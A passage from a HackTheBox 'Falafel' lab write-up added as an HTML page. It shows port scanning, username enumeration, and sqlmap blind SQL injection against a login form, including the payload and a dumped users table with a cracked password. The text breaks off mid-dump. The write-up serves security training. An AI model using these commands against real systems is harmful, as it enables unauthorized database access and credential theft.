@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Falafel</strong></h1>
+        <em>Released: 3rd February 2019 / Pwned: 6th November 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Falafel is full of common exploits, but with the difficulty turned up. To get a shell on the sytsem, tou sql inject into a login form and bypass a file upload restriction. Once on the sytsem, both priv-escs revolve around group permissions. <code>moshe</code> hash access some raw image data, and yossi can read the system's disk.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Use sqlmap and --string to inject into the login form at <code>/login.php</code><br>
+        • Bypass the file upload restrictions by uploading a long file name, and have the web app trunacate the file down to a <code>.php</code><br>
+        • Retrieve raw image data from <code>/dev/fb0</code>, and view it with GIMP<br>
+        • Read <code>/dev/sda1</code> with <code>debugfs</code> and grab root's ssh private key<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-all.txt 10.10.10.73</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p &lt;open ports&gt; -T4 -sV -sC -O -oN nmap/tcp-open.txt 10.10.10.73</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.73</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http<br>
+                <br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;22,80&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.73</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;Linux<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;36<span style="color:#ff9d00;font-weight:700">:</span>c0<span style="color:#ff9d00;font-weight:700">:</span>0a<span style="color:#ff9d00;font-weight:700">:</span>26<span style="color:#ff9d00;font-weight:700">:</span>43<span style="color:#ff9d00;font-weight:700">:</span>f8<span style="color:#ff9d00;font-weight:700">:</span>ce<span style="color:#ff9d00;font-weight:700">:</span>a8<span style="color:#ff9d00;font-weight:700">:</span>2c<span style="color:#ff9d00;font-weight:700">:</span>0d<span style="color:#ff9d00;font-weight:700">:</span>19<span style="color:#ff9d00;font-weight:700">:</span>21<span style="color:#ff9d00;font-weight:700">:</span>10<span style="color:#ff9d00;font-weight:700">:</span>a6<span style="color:#ff9d00;font-weight:700">:</span>a8<span style="color:#ff9d00;font-weight:700">:</span>e7&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;cb<span style="color:#ff9d00;font-weight:700">:</span>20<span style="color:#ff9d00;font-weight:700">:</span>fd<span style="color:#ff9d00;font-weight:700">:</span>ff<span style="color:#ff9d00;font-weight:700">:</span>a8<span style="color:#ff9d00;font-weight:700">:</span>80<span style="color:#ff9d00;font-weight:700">:</span>f2<span style="color:#ff9d00;font-weight:700">:</span>a2<span style="color:#ff9d00;font-weight:700">:</span>4b<span style="color:#ff9d00;font-weight:700">:</span>2b<span style="color:#ff9d00;font-weight:700">:</span>bb<span style="color:#ff9d00;font-weight:700">:</span>e1<span style="color:#ff9d00;font-weight:700">:</span>76<span style="color:#ff9d00;font-weight:700">:</span>98<span style="color:#ff9d00;font-weight:700">:</span>d0<span style="color:#ff9d00;font-weight:700">:</span>fb&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;c4<span style="color:#ff9d00;font-weight:700">:</span>79<span style="color:#ff9d00;font-weight:700">:</span>2b<span style="color:#ff9d00;font-weight:700">:</span>b6<span style="color:#ff9d00;font-weight:700">:</span>a9<span style="color:#ff9d00;font-weight:700">:</span>b7<span style="color:#ff9d00;font-weight:700">:</span>17<span style="color:#ff9d00;font-weight:700">:</span>4c<span style="color:#ff9d00;font-weight:700">:</span>07<span style="color:#ff9d00;font-weight:700">:</span>40<span style="color:#ff9d00;font-weight:700">:</span>f3<span style="color:#ff9d00;font-weight:700">:</span>e5<span style="color:#ff9d00;font-weight:700">:</span>7c<span style="color:#ff9d00;font-weight:700">:</span>1a<span style="color:#ff9d00;font-weight:700">:</span>e9<span style="color:#ff9d00;font-weight:700">:dd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-robots.txt<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1&nbsp;disallowed&nbsp;entry&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_<span style="color:#ff9d00;font-weight:700">/</span>*.txt<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Falafel&nbsp;Lovers<br>
+                [..]
+            </div>
+        </div><br>
+        <br>
+        Analysis<br>
+        • <code>22/ssh</code> - Nothing to do here.<br>
+        • <code>80/http</code> - The only other place to look.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        I'll start with some hints to be found on the site, and then move on to the sql injection at <code>/login.php</code>.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) Hints - Bruteforce Usernames</strong></h3><br>
+        <br>
+        Browse to <code>/login.php</code>.<br>
+        If you login with a random name - e.g. <code>john</code> - you'll receive an error message - <code>Try again..</code><br>
+        If you login with <code>admin</code>, you'll receive a different error message - <code>Wrong identification : admin</code><br>
+        <br>
+        You can use these error messages to bruteforce for valid usernames on the system.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#patator&nbsp;http_fuzz&nbsp;method=POST&nbsp;url="http://falafel.htb/login.php"&nbsp;body="username=FILE0&amp;password=p4ssword"&nbsp;0=/usr/share/seclists/Usernames/Names/names.txt&nbsp;-x&nbsp;ignore:fgrep='Try&nbsp;again..'</span><br>
+                10<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;Starting&nbsp;Patator&nbsp;v0.7&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>lanjelot<span style="color:#ff9d00;font-weight:700">/</span>patator<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-11-06&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>54&nbsp;GMT<br>
+                10<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                10<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;code&nbsp;size<span style="color:#ff9d00;font-weight:700">:</span>clen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;candidate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;num&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;mesg<br>
+                10<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;-----------------------------------------------------------------------------<br>
+                10<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;200&nbsp;&nbsp;7432<span style="color:#ff9d00;font-weight:700">:</span>7091&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.056&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;86&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;HTTP<span style="color:#ff9d00;font-weight:700">/</span>1.1&nbsp;200&nbsp;OK<br>
+                10<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>50&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;200&nbsp;&nbsp;7432<span style="color:#ff9d00;font-weight:700">:</span>7091&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.060&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;chris&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;1883&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;HTTP<span style="color:#ff9d00;font-weight:700">/</span>1.1&nbsp;200&nbsp;OK<br>
+                10<span style="color:#ff9d00;font-weight:700">:</span>55<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;Hits<span style="color:#ff9d00;font-weight:700">/</span>Done<span style="color:#ff9d00;font-weight:700">/</span>Skip<span style="color:#ff9d00;font-weight:700">/</span>Fail<span style="color:#ff9d00;font-weight:700">/</span>Size<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2<span style="color:#ff9d00;font-weight:700">/</span>10163<span style="color:#ff9d00;font-weight:700">/</span>0<span style="color:#ff9d00;font-weight:700">/</span>0<span style="color:#ff9d00;font-weight:700">/</span>10163,&nbsp;Avg<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;171&nbsp;r<span style="color:#ff9d00;font-weight:700">/</span>s,&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0h&nbsp;0m&nbsp;59s
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2b) Hints - .txt Directory Bruteforce</strong></h3><br>
+        Nmap script scan found that the Falafel Lovers site's <code>/robots.txt</code> has an entry blocking all <code>.txt</code> files.<br>
+            <div class="codebox">
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-robots.txt<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1&nbsp;disallowed&nbsp;entry&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_<span style="color:#ff9d00;font-weight:700">/</span>*.txt
+            </div>
+        </div><br>
+        <br>
+        Bruteforce for <code>.txt</code> files on the site with gobuster.<br>
+        You'll find <code>cyberlaw.txt</code>.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#gobuster&nbsp;dir&nbsp;-e&nbsp;-u&nbsp;http://falafel.htb&nbsp;-w&nbsp;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&nbsp;-o&nbsp;gb2.txt&nbsp;-s&nbsp;200,204,301,302,307,401,403&nbsp;-x&nbsp;.txt</span><br>
+                ===============================================================<br>
+                Gobuster&nbsp;v3.0.1<br>
+                by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ===============================================================<br>
+                [...]<br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>falafel.htb<span style="color:#ff9d00;font-weight:700">/</span>robots.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>falafel.htb<span style="color:#ff9d00;font-weight:700">/</span>cyberlaw.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>falafel.htb<span style="color:#ff9d00;font-weight:700">/</span>server-status&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <code>http://falafel.htb/cyberlaw.txt</code> contains an email from the admin.<br>
+        <code>chris</code> has managed to login as <code>admin</code> and get a shell on the system through the file upload feature.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>2c) /login.php - SQL Injection</strong></h3><br>
+        To use sqlmap with a POST request, we need to save it to a file.<br>
+        <br>
+        Login at <code>/login.php</code> and capture the request in Burp.<br>
+        Save the POST request to a file.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        We can help sqlmap identify incorrect logins by providing the <code>Wrong identification</code> string found from earlier testing.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#sqlmap&nbsp;-r&nbsp;login.request&nbsp;-p&nbsp;username,password&nbsp;--level&nbsp;5&nbsp;--risk&nbsp;3&nbsp;--string&nbsp;"Wrong&nbsp;identification"&nbsp;--batch</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__H__<br>
+                &nbsp;___&nbsp;___[)]_____&nbsp;___&nbsp;___&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>1.3.10#stable<span style="color:#ff9d00;font-weight:700">}</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;-<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;[.]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;.<span style="color:#3ad900;font-weight:400">'|&nbsp;.&nbsp;|<br>
+                |___|_&nbsp;&nbsp;[,]_|_|_|__,|&nbsp;&nbsp;_|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_|V...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_|&nbsp;&nbsp;&nbsp;http://sqlmap.org<br>
+                <br>
+                [13:25:21]&nbsp;[INFO]&nbsp;parsing&nbsp;HTTP&nbsp;request&nbsp;from&nbsp;'</span>login.request<span style="color:#3ad900;font-weight:400">'<br>
+                [13:25:21]&nbsp;[WARNING]&nbsp;provided&nbsp;parameters&nbsp;'</span>username,&nbsp;password<span style="color:#3ad900;font-weight:400">'&nbsp;are&nbsp;not&nbsp;inside&nbsp;the&nbsp;Cookie<br>
+                [13:25:21]&nbsp;[INFO]&nbsp;testing&nbsp;connection&nbsp;to&nbsp;the&nbsp;target&nbsp;URL<br>
+                [13:25:21]&nbsp;[INFO]&nbsp;testing&nbsp;if&nbsp;the&nbsp;provided&nbsp;string&nbsp;is&nbsp;within&nbsp;the&nbsp;target&nbsp;URL&nbsp;page&nbsp;content<br>
+                [13:25:21]&nbsp;[WARNING]&nbsp;heuristic&nbsp;(basic)&nbsp;test&nbsp;shows&nbsp;that&nbsp;POST&nbsp;parameter&nbsp;'</span>username<span style="color:#3ad900;font-weight:400">'&nbsp;might&nbsp;not&nbsp;be&nbsp;injectable<br>
+                [13:25:22]&nbsp;[INFO]&nbsp;testing&nbsp;for&nbsp;SQL&nbsp;injection&nbsp;on&nbsp;POST&nbsp;parameter&nbsp;'</span>username<span style="color:#3ad900;font-weight:400">'<br>
+                <br>
+                [...]<br>
+                <br>
+                [13:25:47]&nbsp;[INFO]&nbsp;checking&nbsp;if&nbsp;the&nbsp;injection&nbsp;point&nbsp;on&nbsp;POST&nbsp;parameter&nbsp;'</span>username<span style="color:#3ad900;font-weight:400">'&nbsp;is&nbsp;a&nbsp;false&nbsp;positive<br>
+                POST&nbsp;parameter&nbsp;'</span>username<span style="color:#3ad900;font-weight:400">'&nbsp;is&nbsp;vulnerable.&nbsp;Do&nbsp;you&nbsp;want&nbsp;to&nbsp;keep&nbsp;testing&nbsp;the&nbsp;others&nbsp;(if&nbsp;any)?&nbsp;[y/N]&nbsp;N<br>
+                sqlmap&nbsp;identified&nbsp;the&nbsp;following&nbsp;injection&nbsp;point(s)&nbsp;with&nbsp;a&nbsp;total&nbsp;of&nbsp;526&nbsp;HTTP(s)&nbsp;requests:<br>
+                ---<br>
+                Parameter:&nbsp;username&nbsp;(POST)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Type:&nbsp;boolean-based&nbsp;blind<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Title:&nbsp;AND&nbsp;boolean-based&nbsp;blind&nbsp;-&nbsp;WHERE&nbsp;or&nbsp;HAVING&nbsp;clause<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Payload:&nbsp;username=admin'</span>&nbsp;AND&nbsp;7056=7056--&nbsp;poxO<span style="color:#ff9d00;font-weight:700">&amp;</span>password=omegalul<br>
+                ---<br>
+                [13<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>48]&nbsp;[INFO]&nbsp;testing&nbsp;MySQL<br>
+                [13<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>49]&nbsp;[INFO]&nbsp;confirming&nbsp;MySQL<br>
+                [13<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>49]&nbsp;[INFO]&nbsp;the&nbsp;back-end&nbsp;DBMS&nbsp;is&nbsp;MySQL<br>
+                web&nbsp;server&nbsp;operating&nbsp;system<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Linux&nbsp;Ubuntu&nbsp;16.04&nbsp;or&nbsp;16.10&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>yakkety&nbsp;or&nbsp;xenial<span style="color:#ff9d00;font-weight:700">)</span><br>
+                web&nbsp;application&nbsp;technology<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache&nbsp;2.4.18<br>
+                back-end&nbsp;DBMS<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;MySQL&nbsp;&gt;=&nbsp;5.0.0
+            </div>
+        </div><br>
+        <br>
+        Success!<br>
+        The <code>username</code> parameter is vulnerable to boolean-base blind injection.<br>
+        <br>
+        Use <code>sqlmap</code> to find the databases and tables in the database.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#sqlmap&nbsp;-r&nbsp;login.request&nbsp;-p&nbsp;username,password&nbsp;--level&nbsp;5&nbsp;--risk&nbsp;3&nbsp;--string&nbsp;"Wrong&nbsp;identification"&nbsp;--batch&nbsp;--dbms&nbsp;mysql&nbsp;--tables</span><br>
+                [...]<br>
+                [13<span style="color:#ff9d00;font-weight:700">:</span>28<span style="color:#ff9d00;font-weight:700">:</span>07]&nbsp;[INFO]&nbsp;retrieved<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2<br>
+                [13<span style="color:#ff9d00;font-weight:700">:</span>28<span style="color:#ff9d00;font-weight:700">:</span>07]&nbsp;[INFO]&nbsp;retrieved<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;information_schema<br>
+                [13<span style="color:#ff9d00;font-weight:700">:</span>28<span style="color:#ff9d00;font-weight:700">:</span>13]&nbsp;[INFO]&nbsp;retrieved<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;falafel<br>
+                [13<span style="color:#ff9d00;font-weight:700">:</span>28<span style="color:#ff9d00;font-weight:700">:</span>15]&nbsp;[INFO]&nbsp;fetching&nbsp;tables&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">databases</span>:&nbsp;'falafel,&nbsp;information_schema'<br>
+                [13:28:15]&nbsp;[INFO]&nbsp;fetching&nbsp;number&nbsp;of&nbsp;tables&nbsp;for&nbsp;database&nbsp;'falafel'<br>
+                [13:28:15]&nbsp;[INFO]&nbsp;retrieved:&nbsp;1<br>
+                [13:28:16]&nbsp;[INFO]&nbsp;retrieved:&nbsp;users
+            </div>
+        </div><br>
+        <br>
+        There's a database called <code>falafel</code> with a table of <code>users</code>, which is probably what we want.<br>
+        Use <code>--dump</code> to dump its contents.<br>
+        <code>--batch</code> (don't ask me questions) means that sqlmap chose to try to crack the md5 hashes for me.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>falafel<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#sqlmap&nbsp;-r&nbsp;login.request&nbsp;-p&nbsp;username,password&nbsp;--level&nbsp;5&nbsp;--risk&nbsp;3&nbsp;--string&nbsp;"Wrong&nbsp;identification"&nbsp;--batch&nbsp;--dbms&nbsp;mysql&nbsp;-D&nbsp;falafel&nbsp;-T&nbsp;users&nbsp;--dump</span><br>
+                [...]<br>
+                [13<span style="color:#ff9d00;font-weight:700">:</span>29<span style="color:#ff9d00;font-weight:700">:</span>47]&nbsp;[INFO]&nbsp;cracked&nbsp;password&nbsp;<span style="color:#3ad900;font-weight:400">'juggling'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">user</span>&nbsp;'chris'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
